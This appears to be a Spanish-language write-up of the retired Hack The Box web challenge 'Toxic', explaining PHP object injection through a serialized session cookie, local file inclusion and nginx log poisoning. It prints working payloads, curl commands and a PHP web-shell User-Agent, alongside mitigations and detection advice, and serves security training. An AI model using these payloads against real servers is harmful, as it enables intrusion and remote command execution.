---
challenge: Toxic
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, php, deserialization, object-injection, lfi, log-poisoning]
---


# Toxic — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

- La cookie `PHPSESSID` contiene un objeto PHP serializado en base64 que la aplicación pasa por `unserialize`.
- La clase `PageModel` tiene `public $file` y un `__destruct()` que hace `include($this->file)`: inyectando el objeto se controla una inclusión de fichero (**LFI**).
- Para convertir el LFI en RCE se envenena el log de nginx con código PHP en el `User-Agent` y se incluye `/var/log/nginx/access.log`.

## Enunciado y superficie

Un sitio con una página de inicio y una cookie de sesión que cambia en cada visita. No hay login ni formulario: todo el estado del cliente viaja en la cookie, que la aplicación deserializa.

## Reconocimiento

- Inspeccionar la cookie con las DevTools: el valor es base64 que, al decodificarlo, empieza por `O:` (objeto serializado de PHP).
- Enumerar rutas y ficheros habituales (`/index.php`, `?page=`) y comprobar que no hay otros puntos de entrada.
- Confirmar que el servidor es nginx para elegir la ruta del log.

## Análisis del código

```php
class PageModel {
    public $file;
    public function __destruct() {
        include($this->file);
    }
}

if (isset($_COOKIE['PHPSESSID'])) {
    $obj = unserialize(base64_decode($_COOKIE['PHPSESSID']));
}
```

Dos detalles clave:

1. No hay allowlist de clases (`allowed_classes`): cualquier clase cargada se puede instanciar desde la cookie.
2. La propiedad `$file` no se valida y se pasa a `include()` al destruirse el objeto, al final de la petición.

## Explicación del fallo

La vulnerabilidad es de **inyección de objetos PHP** que termina en **inclusión local de ficheros**. El `unserialize` de datos del cliente permite construir un `PageModel` con la propiedad `$file` apuntando a cualquier ruta legible por el servidor; el método mágico `__destruct` ejecuta el `include` sin comprobar origen ni extensión.

Como `include` interpreta el contenido como PHP si encuentra las etiquetas, basta con que un fichero del sistema contenga código PHP controlado por el atacante: de ahí el **log poisoning**.

## Reproducción local

- Levantar un PHP + nginx con la misma clase y un log escribible por el usuario del servicio, y apuntar el exploit a `127.0.0.1`.
- Comprobar primero el LFI con `/etc/passwd` antes de intentar el veneno.

## Explotación

1. Comprobar el LFI incluyendo `/etc/passwd`:

```php
O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
```

```bash
PAYLOAD=$(printf 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" http://<IP>:<puerto>/
```

2. Envenenar el log de nginx con una petición cuyo `User-Agent` sea código PHP:

```bash
curl -s -A '<?php system($_GET["c"]); ?>' http://<IP>:<puerto>/
```

3. Incluir el log y ejecutar comandos con `?c=`:

```php
O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
```

```bash
PAYLOAD=$(printf 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64 -w0)
curl -s -b "PHPSESSID=$PAYLOAD" "http://<IP>:<puerto>/?c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Con `?c=cat /flag*` aparece la flag.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Longitud de la propiedad**: `s:4:"file"` y `s:11:"/etc/passwd"` cuentan caracteres exactos (incluido el `/`); un byte de más rompe la deserialización y la cookie se ignora en silencio.
- **Base64 con saltos de línea**: usar `-w0` para que la cookie no se corte.
- **Ruta del log**: depende del servidor (`/var/log/nginx/access.log`, `/var/log/apache2/access.log`); si no se puede leer, probar `/proc/self/environ` o ficheros de sesión.
- **`unserialize` sobre datos del cliente** es ejecución de código a través de métodos mágicos, no solo lectura de datos.
- Mitigación: `json_decode` para el estado del cliente, `allowed_classes => false` y listas blancas de ficheros incluidos.

## Mitigaciones y detección

- No deserializar datos del cliente; si es imprescindible, `allowed_classes => false` y firma/HMAC del estado.
- Sustituir `include($file)` por una lista blanca de plantillas y rechazar rutas absolutas o `..`.
- Detección: valores de cookie que decodifican a objetos PHP, `include` de rutas de log y `User-Agent` con etiquetas `<?php`.

## Referencias

- [OWASP: PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
